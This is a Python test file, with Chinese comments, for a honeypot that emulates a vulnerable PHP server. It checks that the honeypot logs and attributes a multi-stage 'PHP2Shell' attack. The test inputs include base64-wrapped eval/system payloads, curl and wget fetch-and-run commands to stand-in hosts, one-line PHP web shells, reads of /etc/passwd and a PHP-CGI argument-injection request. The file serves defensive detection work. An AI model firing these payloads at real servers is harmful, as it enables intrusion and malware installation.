import asyncio
import base64
import hashlib
import json
import os
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch

import pytest

from trap.handlers.default import HTTPHandler
from trap.main import Honeypot
from trap.storage.file import FileStorage
from trap.storage.mysql import MySQLStorage


def _parse_audit_metadata(decoded_content: str) -> dict:
    assert decoded_content.startswith("[PHP2SHELL_AUDIT] ")
    first_line = decoded_content.split("\n", 1)[0]
    raw_json = first_line[len("[PHP2SHELL_AUDIT] ") :].strip()
    return json.loads(raw_json)


# =====================================================================
# 1. 单元测试 (Unit Tests)
# =====================================================================


def test_stage1_php_fingerprint_and_upload_progress_probe():
    handler = HTTPHandler()

    # 1a. 普通 HTTP 请求暴露易受攻击的 PHP 版本号 (< 8.3.36)，保持协议名 "http" 向后兼容
    proto, decoded, resp = handler.handle(b"GET / HTTP/1.1\r\nHost: target.local\r\n\r\n")
    assert proto == "http"
    assert b"X-Powered-By: PHP/8.3.34" in resp

    # 1b. Nuclei CVE-2026-109618.yaml 风格探测：Multipart 携带 PHPSESSID 与 PHP_SESSION_UPLOAD_PROGRESS
    boundary = "----NucleiProbeBoundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        f"nuclei_sess_fixed_123\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"probe_init\r\n"
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode("utf-8") + body

    proto, decoded, resp = handler.handle(req, session_id="203.0.113.10:50001")
    assert proto == "http/php2shell"
    assert b"Set-Cookie: PHPSESSID=nuclei_sess_fixed_123; path=/" in resp
    meta = _parse_audit_metadata(decoded)
    assert meta["stage"] == "STAGE_1_RECON"
    assert meta["phpsessid"] == "nuclei_sess_fixed_123"
    assert "CVE-2026-109618" in meta["cves"]


def test_stage2_cve_2026_109618_oom_bailout_trigger():
    handler = HTTPHandler()
    boundary = "----OOMTriggerBoundary"

    # 构造未闭合 boundary 且声明超大 Content-Length (128MB) 的 OOM 触发载荷
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f'|O:8:"stdClass":1:{{s:4:"leak";i:1;}}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="heap_groom.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode("utf-8") + (b"\x00\x00\x7f\x41\x41\x41\x41\x41" * 64)

    req = (
        f"POST /upload.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=oom_sess_99\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: 134217728\r\n\r\n"
    ).encode("utf-8") + body

    proto, decoded, resp = handler.handle(req, session_id="203.0.113.20:50002")
    assert proto == "http/php2shell"
    assert b"HTTP/1.1 500 Internal Server Error" in resp
    assert b"Allowed memory size of 134217728 bytes exhausted" in resp

    meta = _parse_audit_metadata(decoded)
    assert meta["stage"] == "STAGE_2_OOM_TRIGGER"
    assert meta["worker_corrupted"] is True
    assert "CVE-2026-109618" in meta["cves"]


def test_stage3_cve_2026_109619_uaf_and_command_execution():
    handler = HTTPHandler()

    # Step 1: 先触发 Stage 2 污染 Worker 全局状态
    boundary = "----BailoutBoundary"
    stage2_body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"corrupt_worker_state\r\n"
        # 故意不闭合 boundary 模拟畸形截断触发 OOM/bailout
    ).encode("utf-8")
    stage2_req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=uaf_worker_1\r\n"
        f"X-PHP2Shell-Malformed: 1\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: 134217728\r\n\r\n"
    ).encode("utf-8") + stage2_body

    _, dec2, _ = handler.handle(stage2_req, session_id="203.0.113.30:51000")
    meta2 = _parse_audit_metadata(dec2)
    assert meta2["stage"] == "STAGE_2_OOM_TRIGGER"

    # Step 2: 同一攻击者在新端口连接上发起 Stage 3 UAF 利用，携带嵌套 Base64 + Canary + 远控下载命令
    inner_php = (
        "system('id; echo CANARY_PHP2SHELL_OK; "
        "wget http://198.51.100.77/dropper.sh -O /tmp/d.sh');"
        "echo md5('verify_rce');"
    )
    b64_payload = base64.b64encode(inner_php.encode()).decode()
    stage3_body = f"payload=eval(base64_decode('{b64_payload}'));".encode("utf-8")
    stage3_req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=uaf_worker_1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(stage3_body)}\r\n\r\n"
    ).encode("utf-8") + stage3_body

    proto3, dec3, resp3 = handler.handle(stage3_req, session_id="203.0.113.30:51001")
    assert proto3 == "http/php2shell"
    assert b"uid=33(www-data) gid=33(www-data) groups=33(www-data)" in resp3
    assert b"CANARY_PHP2SHELL_OK" in resp3
    expected_md5 = hashlib.md5(b"verify_rce").hexdigest().encode()
    assert expected_md5 in resp3

    meta3 = _parse_audit_metadata(dec3)
    assert meta3["attack_id"] == meta2["attack_id"]
    assert meta3["stage"] == "STAGE_3_UAF_RCE"
    assert meta3["step_index"] == 2
    assert "CVE-2026-109618" in meta3["cves"]
    assert "CVE-2026-109619" in meta3["cves"]
    assert "http://198.51.100.77/dropper.sh" in meta3["iocs"]
    assert any("id" in c for c in meta3["extracted_commands"])


def test_stage4_virtual_webshell_persistence_and_interaction():
    handler = HTTPHandler()

    # Stage 3: 攻击者通过漏洞写入虚拟 Webshell /var/www/html/shell.php
    shell_b64 = base64.b64encode(b"<?php @eval($_POST['cmd']); ?>").decode()
    drop_body = (
        f"data=file_put_contents('/var/www/html/shell.php', base64_decode('{shell_b64}'));"
        f"system('echo DROPPED_OK');"
    ).encode("utf-8")
    drop_req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(drop_body)}\r\n\r\n"
    ).encode("utf-8") + drop_body

    _, dec_drop, resp_drop = handler.handle(drop_req, session_id="203.0.113.40:60001")
    assert b"DROPPED_OK" in resp_drop
    meta_drop = _parse_audit_metadata(dec_drop)
    assert "/shell.php" in meta_drop["dropped_files"]

    # Stage 4: 攻击者在新连接访问刚刚写入的 /shell.php 执行后渗透命令
    post_body = b"cmd=whoami; pwd; ls -la; cat /etc/passwd"
    webshell_req = (
        f"POST /shell.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(post_body)}\r\n\r\n"
    ).encode("utf-8") + post_body

    proto4, dec4, resp4 = handler.handle(webshell_req, session_id="203.0.113.40:60002")
    assert proto4 == "http/php2shell"
    assert b"www-data" in resp4
    assert b"/var/www/html" in resp4
    assert b"shell.php" in resp4
    assert b"root:x:0:0:root:/root:/bin/bash" in resp4

    meta4 = _parse_audit_metadata(dec4)
    assert meta4["attack_id"] == meta_drop["attack_id"]
    assert meta4["stage"] == "STAGE_4_POST_EXPLOIT"
    assert "/shell.php" in meta4["active_virtual_files"]


def test_multipart_fragmented_tcp_packets():
    handler = HTTPHandler()
    boundary = "----FragmentedBoundary777"

    part1 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"frag_exploit\r\n"
    ).encode("utf-8")
    part2 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="payload"; filename="p.php"\r\n\r\n'
        f"<?php system('id; uname -a'); ?>\r\n"
    ).encode("utf-8")
    part3 = f"--{boundary}--\r\n".encode("utf-8")

    total_body = part1 + part2 + part3
    headers = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(total_body)}\r\n\r\n"
    ).encode("utf-8")

    session_id = "203.0.113.50:44444"

    # 第 1 个分片：仅包含 Header + Part 1
    proto1, dec1, resp1 = handler.handle(headers + part1, session_id=session_id)
    assert proto1 == "http/php2shell"
    assert "[PHP2SHELL_FRAGMENT chunk=1" in dec1
    assert resp1 == b""  # 未收齐前绝不提前返回 200 OK

    # 第 2 个分片：包含 Part 2
    proto2, dec2, resp2 = handler.handle(part2, session_id=session_id)
    assert proto2 == "http/php2shell"
    assert "[PHP2SHELL_FRAGMENT chunk=2" in dec2
    assert resp2 == b""

    # 第 3 个分片：包含尾边界 Part 3，触发完整解析与回显
    proto3, dec3, resp3 = handler.handle(part3, session_id=session_id)
    assert proto3 == "http/php2shell"
    assert b"HTTP/1.1 200 OK" in resp3
    assert b"uid=33(www-data)" in resp3
    assert b"Linux ubuntu-web01" in resp3
    meta3 = _parse_audit_metadata(dec3)
    assert meta3["stage"] == "STAGE_3_UAF_RCE"


def test_storage_metadata_extraction(tmp_path):
    handler = HTTPHandler()
    req = (
        b"GET /index.php?cmd=id HTTP/1.1\r\n"
        b"Host: target.local\r\n\r\n"
    )
    proto, decoded, _ = handler.handle(req, session_id="203.0.113.60:12345")

    # 1. 验证 FileStorage 自动提取 metadata JSON 字段
    log_file = tmp_path / "audit_test.log"
    fs = FileStorage(str(log_file), max_size_mb=10)
    fs.setup()
    ts = datetime.now(timezone.utc)
    fs.record(ts, "203.0.113.60", req, decoded, proto)

    with open(log_file, "r") as f:
        entry = json.loads(f.readline())
        assert entry["protocol"] == "http/php2shell"
        assert "metadata" in entry
        assert entry["metadata"]["stage"] == "STAGE_3_UAF_RCE"
        assert "id" in entry["metadata"]["extracted_commands"]

    # 2. 验证 MySQLStorage 自动将 metadata 写入数据库列
    with patch("mysql.connector.connect"), patch(
        "mysql.connector.pooling.MySQLConnectionPool"
    ) as mock_pool:
        mock_pool_inst = MagicMock()
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_pool.return_value = mock_pool_inst
        mock_pool_inst.get_connection.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor

        ms = MySQLStorage("localhost", "root", "", "trap")
        ms.record(ts, "203.0.113.60", req, decoded, proto)

        query, params = mock_cursor.execute.call_args[0]
        assert "metadata" in query
        assert len(params) == 6
        assert json.loads(params[5])["stage"] == "STAGE_3_UAF_RCE"


def test_cve_2024_4577_php_cgi_compat():
    handler = HTTPHandler()
    body = b"<?php system('whoami'); echo 'CGI_RCE_OK'; ?>"
    req = (
        b"POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1\r\n"
        b"Host: target.local\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    )
    proto, decoded, resp = handler.handle(req, session_id="203.0.113.70:33333")
    assert proto == "http/php2shell"
    assert b"www-data" in resp
    assert b"CGI_RCE_OK" in resp
    meta = _parse_audit_metadata(decoded)
    assert "CVE-2024-4577" in meta["cves"]


# =====================================================================
# 2. 集成测试 (End-to-End Integration Tests Simulating Real Exploits)
# =====================================================================


async def _send_raw_http(host: str, port: int, chunks: list[bytes]) -> bytes:
    reader, writer = await asyncio.open_connection(host, port)
    for chunk in chunks:
        writer.write(chunk)
        await writer.drain()
        if len(chunks) > 1:
            await asyncio.sleep(0.02)
    response = await asyncio.wait_for(reader.read(8192), timeout=3.0)
    writer.close()
    await writer.wait_closed()
    return response


@pytest.mark.asyncio
async def test_integration_full_php2shell_exploit_chain(tmp_path, monkeypatch):
    """
    参考真实世界的 PHP2Shell (CVE-2026-109618 + CVE-2026-109619) 多阶段自动化攻击脚本：
    1. 扫描探测目标 PHP 版本与 session.upload_progress 会话固定行为 (Stage 1)
    2. 分片发送畸形 Multipart + 序列化伪造结构触发 zend_bailout OOM 内存污染 (Stage 2)
    3. 携带相同 PHPSESSID 触发 var_destroy UAF，执行系统命令校验 Canary、拉取远控木马并写入 Webshell (Stage 3)
    4. 访问落地的 Webshell 进行后渗透信息收集 (Stage 4)
    5. 检查蜜罐日志文件是否完整记录并关联了攻击全过程。
    """
    log_file = tmp_path / "honey_php2shell.log"
    monkeypatch.setenv("STORAGE_TYPE", "file")
    monkeypatch.setenv("LOG_FILE", str(log_file))

    hp = Honeypot()
    server = await asyncio.start_server(hp.handle_connection, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    server_task = asyncio.create_task(server.serve_forever())

    try:
        # -----------------------------------------------------------------
        # Phase 1: 模拟攻击脚本执行指纹探测与 Session Upload Progress 检查
        # -----------------------------------------------------------------
        boundary_probe = "----WebKitFormBoundaryRecon01"
        probe_body = (
            f"--{boundary_probe}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            f"pwn_session_2026\r\n"
            f"--{boundary_probe}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"check_rfc1867\r\n"
            f"--{boundary_probe}--\r\n"
        ).encode("utf-8")
        probe_req = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) PHP2Shell-Scanner/1.0\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary_probe}\r\n"
            f"Content-Length: {len(probe_body)}\r\n\r\n"
        ).encode("utf-8") + probe_body

        resp_stage1 = await _send_raw_http("127.0.0.1", port, [probe_req])
        assert b"X-Powered-By: PHP/8.3.34" in resp_stage1
        assert b"Set-Cookie: PHPSESSID=pwn_session_2026; path=/" in resp_stage1

        # -----------------------------------------------------------------
        # Phase 2: 模拟 Producer 请求 (CVE-2026-109618) —— 多分片发送 OOM 触发包
        # 在 php_session_rfc1867_callback 初始化中途触发 longjmp()
        # -----------------------------------------------------------------
        boundary_oom = "----WebKitFormBoundaryOOMBailout"
        oom_chunk1 = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Cookie: PHPSESSID=pwn_session_2026\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary_oom}\r\n"
            f"Content-Length: 134217728\r\n\r\n"
        ).encode("utf-8")

        # 伪造 zend_object / zval 堆布局与未闭合的 multipart 块
        fake_heap_pointers = b"\x00\x00\x7f\xff\xe4\x10\x40\x00" * 40
        oom_chunk2 = (
            f"--{boundary_oom}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f'|O:8:"stdClass":2:{{s:3:"ptr";i:140737019707392;s:4:"pad";s:256:"AAAA";}}\r\n'
            f"--{boundary_oom}\r\n"
            f'Content-Disposition: form-data; name="upload[0][1][2][3][4][5]"; filename="oom.bin"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode("utf-8") + fake_heap_pointers

        resp_stage2 = await _send_raw_http("127.0.0.1", port, [oom_chunk1, oom_chunk2])
        assert b"HTTP/1.1 500 Internal Server Error" in resp_stage2
        assert b"Allowed memory size of 134217728 bytes exhausted" in resp_stage2

        # -----------------------------------------------------------------
        # Phase 3: 模拟 Consumer 请求 (CVE-2026-109619) —— 跨连接劫持残留状态执行 RCE
        # 攻击脚本验证 Canary、执行木马下载并写入持久化 Webshell
        # -----------------------------------------------------------------
        webshell_code = b"<?php @eval($_POST['ant']); ?>"
        webshell_b64 = base64.b64encode(webshell_code).decode()
        rce_php_code = (
            f"system('id; uname -a; echo PWNED_BY_PHP2SHELL_2026; "
            f"curl -fsSL http://203.0.113.250:8080/potassium_bot.sh | sh');"
            f"file_put_contents('/var/www/html/wp-conf.php', base64_decode('{webshell_b64}'));"
        )
        rce_b64 = base64.b64encode(rce_php_code.encode("utf-8")).decode()

        stage3_body = f"uaf_trigger=1&code=eval(base64_decode('{rce_b64}'));".encode("utf-8")
        stage3_req = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Cookie: PHPSESSID=pwn_session_2026\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(stage3_body)}\r\n\r\n"
        ).encode("utf-8") + stage3_body

        resp_stage3 = await _send_raw_http("127.0.0.1", port, [stage3_req])
        assert b"HTTP/1.1 200 OK" in resp_stage3
        # 攻击脚本校验回显 Canary 与 uid，决定是否继续发起第 4 阶段请求
        assert b"uid=33(www-data)" in resp_stage3
        assert b"PWNED_BY_PHP2SHELL_2026" in resp_stage3

        # -----------------------------------------------------------------
        # Phase 4: 模拟攻击脚本连接刚刚写入的虚拟 Webshell (/wp-conf.php) 执行后渗透指令
        # -----------------------------------------------------------------
        stage4_body = b"ant=system('whoami; pwd; ls -la; cat /etc/passwd');"
        stage4_req = (
            f"POST /wp-conf.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Cookie: PHPSESSID=pwn_session_2026\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(stage4_body)}\r\n\r\n"
        ).encode("utf-8") + stage4_body

        resp_stage4 = await _send_raw_http("127.0.0.1", port, [stage4_req])
        assert b"www-data" in resp_stage4
        assert b"wp-conf.php" in resp_stage4
        assert b"root:x:0:0:root:/root:/bin/bash" in resp_stage4

        # 等待异步日志写入完成
        await asyncio.sleep(0.15)

    finally:
        server_task.cancel()
        try:
            await server_task
        except asyncio.CancelledError:
            pass

    # -----------------------------------------------------------------
    # 验证日志完整记录了攻击全过程
    # -----------------------------------------------------------------
    assert os.path.exists(log_file)
    with open(log_file, "r") as f:
        log_entries = [json.loads(line) for line in f if line.strip()]

    # 共 5 条记录：Stage1 (1条) + Stage2 (分片1 + 分片2完结 = 2条) + Stage3 (1条) + Stage4 (1条)
    assert len(log_entries) == 5
    assert all(e["protocol"] == "http/php2shell" for e in log_entries)

    audit_entries = [e for e in log_entries if "metadata" in e]
    assert len(audit_entries) == 4

    stages_recorded = [e["metadata"]["stage"] for e in audit_entries]
    assert stages_recorded == [
        "STAGE_1_RECON",
        "STAGE_2_OOM_TRIGGER",
        "STAGE_3_UAF_RCE",
        "STAGE_4_POST_EXPLOIT",
    ]

    # 验证所有阶段共享同一个 attack_id 且 step_index 递增 (1, 2, 3, 4)
    attack_ids = {e["metadata"]["attack_id"] for e in audit_entries}
    assert len(attack_ids) == 1
    assert [e["metadata"]["step_index"] for e in audit_entries] == [1, 2, 3, 4]

    # 验证 Stage 3 与 Stage 4 的 CVE 归因、IOC 提取、Base64 解码与落地文件记录
    stage3_meta = audit_entries[2]["metadata"]
    assert "CVE-2026-109618" in stage3_meta["cves"]
    assert "CVE-2026-109619" in stage3_meta["cves"]
    assert "http://203.0.113.250:8080/potassium_bot.sh" in stage3_meta["iocs"]
    assert "/wp-conf.php" in stage3_meta["dropped_files"]
    assert any("<?php @eval($_POST['ant']); ?>" in p for p in stage3_meta["decoded_payloads"])

    stage4_meta = audit_entries[3]["metadata"]
    assert "/wp-conf.php" in stage4_meta["active_virtual_files"]
    assert "cat /etc/passwd" in stage4_meta["extracted_commands"]


@pytest.mark.asyncio
async def test_integration_mod_php_single_shot_and_keepalive_webshell(tmp_path, monkeypatch):
    """
    模拟 Apache mod_php 场景下的单包 Pre-Auth RCE 利用及同一 TCP Keep-Alive 连接上的后续交互：
    1. 单个 Multipart POST 请求同时包含 PHP_SESSION_UPLOAD_PROGRESS 堆损坏载荷与命令执行/写马指令
    2. 攻击者不关闭 TCP 连接，直接复用 Keep-Alive 连接请求刚写入的 /cache.php 执行 phpinfo() 与 uname -a
    """
    log_file = tmp_path / "honey_modphp.log"
    monkeypatch.setenv("STORAGE_TYPE", "file")
    monkeypatch.setenv("LOG_FILE", str(log_file))

    hp = Honeypot()
    server = await asyncio.start_server(hp.handle_connection, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    server_task = asyncio.create_task(server.serve_forever())

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)

        # Request 1: 单包融合利用 (Multipart Upload Progress + Shell Redirection 写马 + Canary 回显)
        boundary = "----ModPhpSingleShotBoundary"
        body1 = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"<?php echo '<?php @eval($_POST[\"k\"]); ?>' > /var/www/html/cache.php; system('id; echo MODPHP_1SHOT_OK'); ?>\r\n"
            f"--{boundary}--\r\n"
        ).encode("utf-8")
        req1 = (
            f"POST / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body1)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode("utf-8") + body1

        writer.write(req1)
        await writer.drain()
        resp1 = await asyncio.wait_for(reader.read(4096), timeout=3.0)
        assert b"uid=33(www-data)" in resp1
        assert b"MODPHP_1SHOT_OK" in resp1

        # Request 2: 在同一个 TCP Keep-Alive 连接上直接访问 /cache.php
        body2 = b"k=phpinfo(); system('uname -a');"
        req2 = (
            f"POST /cache.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body2)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode("utf-8") + body2

        writer.write(req2)
        await writer.drain()
        resp2 = await asyncio.wait_for(reader.read(8192), timeout=3.0)
        assert b"PHP Version 8.3.34" in resp2
        assert b"session.upload_progress.enabled" in resp2
        assert b"Linux ubuntu-web01" in resp2

        writer.close()
        await writer.wait_closed()
        await asyncio.sleep(0.15)

    finally:
        server_task.cancel()
        try:
            await server_task
        except asyncio.CancelledError:
            pass

    with open(log_file, "r") as f:
        entries = [json.loads(line) for line in f if line.strip()]

    assert len(entries) == 2
    assert entries[0]["metadata"]["stage"] == "STAGE_3_UAF_RCE"
    assert entries[1]["metadata"]["stage"] == "STAGE_4_POST_EXPLOIT"
    assert entries[0]["metadata"]["attack_id"] == entries[1]["metadata"]["attack_id"]
    assert "/cache.php" in entries[1]["metadata"]["active_virtual_files"]

